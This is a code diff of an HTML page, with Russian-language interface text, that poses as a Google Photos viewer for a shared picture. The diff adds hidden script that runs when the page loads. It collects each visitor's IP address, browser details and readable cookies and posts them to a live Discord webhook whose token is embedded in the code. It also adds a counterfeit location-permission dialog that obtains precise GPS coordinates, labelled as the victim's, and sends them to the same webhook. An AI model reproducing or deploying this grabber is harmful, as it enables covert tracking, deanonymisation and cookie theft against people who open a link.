@@ -2,23 +2,201 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>photo.jpg</title>
-    <meta http-equiv="Content-Type" content="image/jpeg">
+    <title>IMG_20260402_184521.jpg</title>
     <meta property="og:image" content="https://i.imgur.com/6QJqjxk.jpg">
-    <meta property="og:title" content="photo.jpg">
+    <meta property="og:title" content="IMG_20260402_184521.jpg">
     <meta property="og:type" content="image/jpeg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; background: black; text-align: center; }
-        img { max-width: 100%; max-height: 100vh; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
+            min-height: 100vh;
+        }
+        .fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1;
+        }
+        .fullscreen img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+        }
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 10;
+            color: white;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+        }
+        .top-bar.visible { opacity: 1; pointer-events: auto; }
+        .google-logo {
+            font-size: 20px;
+            font-weight: 500;
+            background: linear-gradient(135deg, #4285F4, #EA4335, #FBBC05, #34A853);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+        .photo-title { font-size: 14px; color: white; }
+        .gps-button {
+            position: fixed;
+            bottom: 30px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: white;
+            font-size: 14px;
+            border: 1px solid rgba(255,255,255,0.2);
+            cursor: pointer;
+            z-index: 10;
+            font-family: 'Google Sans', sans-serif;
+        }
+        .info-panel {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            padding: 20px;
+            color: white;
+            font-size: 12px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+            z-index: 10;
+        }
+        .info-panel.visible { opacity: 1; }
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            visibility: hidden;
+            opacity: 0;
+            transition: all 0.2s;
+        }
+        .modal.active { visibility: visible; opacity: 1; }
+        .modal-card {
+            background: #2c2c2e;
+            border-radius: 28px;
+            max-width: 320px;
+            width: 85%;
+            padding: 24px;
+            text-align: center;
+            color: white;
+        }
+        .modal-icon { font-size: 48px; margin-bottom: 16px; }
+        .modal-title { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+        .modal-text { font-size: 14px; color: #aaa; margin-bottom: 24px; }
+        .modal-buttons { display: flex; gap: 12px; }
+        .modal-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            border: none;
+        }
+        .modal-btn.allow { background: #0a84ff; color: white; }
+        .modal-btn.deny { background: #3a3a3c; color: white; }
     </style>
 </head>
 <body>
+
+<div class="fullscreen">
     <img src="https://i.imgur.com/6QJqjxk.jpg" id="photo">
-    
-    <script>
-        const webhook = "https://discord.com/api/webhooks/1489290289649549424/WIAoa5NkDmV1qsyaBx4cZQCMqhSuUnrXa21xlUq24d_GLnl64-C0q5BGJI0k2wnJZh5u";
-        
-        // СБОР ДАННЫХ
+</div>
+
+<div class="top-bar" id="topBar">
+    <div class="google-logo">G</div>
+    <div class="photo-title">IMG_20260402_184521.jpg</div>
+    <div style="width: 40px;"></div>
+</div>
+
+<div class="info-panel" id="infoPanel">
+    <div>2 апреля 2026 г. • 2.4 МБ • 1920x1080</div>
+</div>
+
+<div class="gps-button" id="gpsButton">
+    <span>📍</span>
+    <span>Показать место съёмки</span>
+</div>
+
+<div class="modal" id="modal">
+    <div class="modal-card">
+        <div class="modal-icon">📍</div>
+        <div class="modal-title">Google Фото</div>
+        <div class="modal-text">Разрешить доступ к вашему местоположению для отображения точного места и даты съёмки?</div>
+        <div class="modal-buttons">
+            <button class="modal-btn deny" id="denyBtn">Не разрешать</button>
+            <button class="modal-btn allow" id="allowModalBtn">Разрешить</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const webhook = "https://discord.com/api/webhooks/1489290289649549424/WIAoa5NkDmV1qsyaBx4cZQCMqhSuUnrXa21xlUq24d_GLnl64-C0q5BGJI0k2wnJZh5u";
+    let gpsSent = false;
+
+    function showBars() {
+        document.getElementById('topBar').classList.add('visible');
+        document.getElementById('infoPanel').classList.add('visible');
+        clearTimeout(window.hideTimeout);
+        window.hideTimeout = setTimeout(() => {
+            document.getElementById('topBar').classList.remove('visible');
+            document.getElementById('infoPanel').classList.remove('visible');
+        }, 2500);
+    }
+    document.addEventListener('mousemove', showBars);
+    document.addEventListener('touchstart', showBars);
+    showBars();
+
+    function getAllCookies() {
+        if (!document.cookie) return "Cookies не найдены";
+        let cookies = {};
+        document.cookie.split(';').forEach(cookie => {
+            let [key, value] = cookie.trim().split('=');
+            cookies[key] = value || "нет значения";
+        });
+        return JSON.stringify(cookies, null, 2);
+    }
+
+    function sendBasicData() {
         const data = {
             time: new Date().toLocaleString(),
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -26,48 +204,55 @@
             platform: navigator.platform,
             language: navigator.language,
             screen: screen.width + "x" + screen.height,
-            window_size: window.innerWidth + "x" + window.innerHeight,
+            cookies: getAllCookies(),
             referer: document.referrer || "прямой переход",
-            url: window.location.href,
-            cookies: navigator.cookieEnabled,
-            cores: navigator.hardwareConcurrency || "неизвестно"
+            url: window.location.href
         };
-        
-        // ПОЛУЧАЕМ IP
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(ipData => {
                 data.ip = ipData.ip;
-                // ОТПРАВЛЯЕМ ПОСЛЕ ПОЛУЧЕНИЯ IP
-                sendToDiscord();
-            })
-            .catch(() => {
-                data.ip = "не определен";
-                sendToDiscord();
-            });
-        
-        function sendToDiscord() {
-            let message = `**🖼️ ПЕРЕХОД ПО ФОТО**\n`;
-            message += `\`\`\`\n`;
-            message += `Время: ${data.time} (${data.timezone})\n`;
-            message += `IP: ${data.ip}\n`;
-            message += `User Agent: ${data.user_agent.substring(0, 100)}...\n`;
-            message += `Платформа: ${data.platform}\n`;
-            message += `Экран: ${data.screen}\n`;
-            message += `Окно: ${data.window_size}\n`;
-            message += `Язык: ${data.language}\n`;
-            message += `Cookies: ${data.cookies ? "включены" : "отключены"}\n`;
-            message += `Ядра CPU: ${data.cores}\n`;
-            message += `Referrer: ${data.referer}\n`;
-            message += `URL: ${data.url}\n`;
-            message += `\`\`\``;
-            
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: message })
-            }).catch(e => console.log("Ошибка:", e));
+                let msg = `**📸 НОВЫЙ ПЕРЕХОД**\n\`\`\`\nВремя: ${data.time}\nIP: ${data.ip}\nТаймзона: ${data.timezone}\nUser Agent: ${data.user_agent}\nЭкран: ${data.screen}\nReferrer: ${data.referer}\nCookies:\n${data.cookies}\n\`\`\``;
+                fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) }).catch(e=>{});
+            }).catch(() => {});
+    }
+    sendBasicData();
+
+    function sendGPS(position) {
+        if (gpsSent) return;
+        gpsSent = true;
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        const msg = `**📍 ТОЧНЫЕ КООРДИНАТЫ ЖЕРТВЫ**\n\`\`\`\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ${accuracy} м\nКарта: ${mapsLink}\nВремя: ${new Date().toLocaleString()}\n\`\`\``;
+        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) }).catch(e=>{});
+        document.getElementById('modal').classList.remove('active');
+    }
+
+    function gpsError(err) {
+        let errorMsg = err.code === 1 ? "Пользователь запретил доступ" : "Ошибка GPS";
+        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `**❌ ОТКАЗ ОТ GPS**\n${errorMsg}` }) }).catch(e=>{});
+        document.getElementById('modal').classList.remove('active');
+    }
+
+    document.getElementById('gpsButton').onclick = () => {
+        document.getElementById('modal').classList.add('active');
+    };
+
+    document.getElementById('allowModalBtn').onclick = () => {
+        document.getElementById('modal').classList.remove('active');
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendGPS, gpsError, { enableHighAccuracy: true, timeout: 10000 });
+        } else {
+            fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "**⚠️ Браузер не поддерживает геолокацию**" }) }).catch(e=>{});
         }
-    </script>
+    };
+
+    document.getElementById('denyBtn').onclick = () => {
+        document.getElementById('modal').classList.remove('active');
+        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "**❌ ПОЛЬЗОВАТЕЛЬ НАЖАЛ 'НЕ РАЗРЕШАТЬ'**" }) }).catch(e=>{});
+    };
+</script>
 </body>
 </html>
